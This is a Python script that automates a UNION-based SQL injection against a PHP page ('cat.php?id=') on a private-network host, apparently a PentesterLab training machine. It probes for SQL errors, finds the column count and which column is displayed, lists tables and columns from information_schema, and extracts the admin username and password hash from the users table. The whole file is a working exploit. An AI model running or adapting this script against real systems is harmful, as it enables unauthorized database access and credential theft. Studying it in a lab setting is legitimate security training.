#!/usr/bin/env python3

import urllib
import urllib.request
import re
import time
import sys

def check_sqli():

	url = "http://192.168.1.108/cat.php?id=1"
	sqli_error_check = urllib.request.urlopen(url + "'")
	body = sqli_error_check.read()

	print("[+] Checking website for SQL injection...")
	time.sleep(1)

	if b"You have an error in your SQL syntax" in body:
		print("[+] Possible SQL injection found!")
		time.sleep(1)
	else:
		print("[-]  SQL injection not found.")
		sys.exit()

def check_column_num():

	print("\n[+] Checking number of columns...")
	time.sleep(1)

	columns_unknown = True

	while columns_unknown:

		column_error = "different number of columns"

		# columns = 1 --> %20 == space
		injection_url = "http://192.168.1.108/cat.php?id=1%20UNION%20SELECT%20null"
		r = urllib.request.urlopen(injection_url)
		b = r.read()
		search = re.search(column_error, b.decode())
		if search:
			print("		[-] Database has more than 1 column.")
		else:
				print("		[+] Database has 1 column!")
				columns_unknown = False
				time.sleep(1)

		# columns = 2
		injection_url = injection_url + ",null"
		r = urllib.request.urlopen(injection_url)
		b = r.read()
		search = re.search(column_error, b.decode())
		if search:
			print("		[-] Database has more than 2 columns.")
		else:
				print("		[+] Database has 2 columns!")
				columns_unknown = False
				time.sleep(1)

		# columns = 3
		injection_url = injection_url + ",null"
		r = urllib.request.urlopen(injection_url)
		b = r.read()
		search = re.search(column_error, b.decode())
		if search:
			print("		[-] Database has more than 3 columns.")
		else:
				print("		[+] Database has 3 columns!")
				columns_unknown = False
				time.sleep(1)

		# columns = 4
		injection_url = injection_url + ",null"
		r = urllib.request.urlopen(injection_url)
		b = r.read()
		search = re.search(column_error, b.decode())
		if search:
			print("		[-] Database has more than 4 columns.")
		else:
				print("		[+] Database has 4 columns!")
				columns_unknown = False
				time.sleep(1)

def check_column_display():

	print("\n[+] Checking dislaying column...")
	time.sleep(1)

	output = "pentesterlab@localhost"
	url = "http://192.168.1.108/cat.php?id=1%20UNION%20SELECT%20"
	unknown_output = True

	while unknown_output:

		# 1st column
		r = urllib.request.urlopen(url + "current_user(),null,null,null")
		b = r.read()
		search = re.search(output, b.decode())
		if search:
			print("		[+] Data displayed in 1st column!")
			unknown_output = False
			time.sleep(1)
		else:
			print("		[-] No data displayed on 1st column.")
			time.sleep(1)

		# 2nd column
		r = urllib.request.urlopen(url + "null,current_user(),null,null")
		b = r.read()
		search = re.search(output, b.decode())
		if search:
			print("		[+] Data displayed in 2nd column!")
			unknown_output = False
			time.sleep(1)
		else:
			print("		[-] No data displayed on 2nd column.")
			time.sleep(1)	

		# 3rd column
		r = urllib.request.urlopen(url + "null,null,current_user(),null")
		b = r.read()
		search = re.search(output, b.decode())
		if search:
			print("		[+] Data displayed in 3rd column!")
			unknown_output = False
			time.sleep(1)
		else:
			print("		[-] No data displayed on 3rd column.")
			time.sleep(1)			

		# 4th column
		r = urllib.request.urlopen(url + "null,null,null,current_user()")
		b = r.read()
		search = re.search(output, b.decode())
		if search:
			print("		[+] Data displayed in 4th column!")
			unknown_output = False
			time.sleep(1)
		else:
			print("		[-] No data displayed on 4th column.")
			time.sleep(1)


def check_names():

		print("\n[+] Checking column and table names for users (table:column)")
		time.sleep(1)

		names = "users:.+"
		url = "http://192.168.1.108/cat.php?id=1%20UNION%20SELECT%20"

		# %27 == '
		r = urllib.request.urlopen(url + "1,concat(table_name,%27:%27,column_name),3,4%20FROM%20information_schema.columns")
		b = r.read()
		search = re.findall(names, b.decode())
		# strip the html tags from the output
		clean = re.compile('<.*?>')
		search = re.sub(clean, '', str(search))
		# strip the "/>" from the output
		re_clean = re.compile('[/>]')
		search = re.sub(re_clean, '', str(search))
		# strip the "[]" and tabs from the output
		re_re_clean = re.compile('[ [\] ]')
		search = re.sub(re_re_clean, '' , str(search))
		# strip the "'" from the output
		new_re_clean = re.compile("[']")
		search = re.sub(new_re_clean, '', str(search))
		new_re_re_clean = re.compile('["]')
		search = re.sub(new_re_re_clean, '', str(search))

		if search:
			for item in search.split(","):
				print("	[+]", item)
				time.sleep(1)
 
def search_admincreds():

		print("\n[+] Searching for admin credentials")
		time.sleep(2)

		url = urllib.request.urlopen("http://192.168.1.108/cat.php?id=1%20UNION%20SELECT%201,concat(login,%27:%27,password),3,4%20FROM%20users")
		r = url.read()

		credentials = "admin:.+"
		search = re.search(credentials, r.decode())

		if search:
			print("		[+] Admin credentials found!")
			print("		[+]", search.group(0).strip('</h2>'))
		else:
			print("		[-] No credentials found...")


check_sqli()
check_column_num()
check_column_display()
check_names()
search_admincreds()
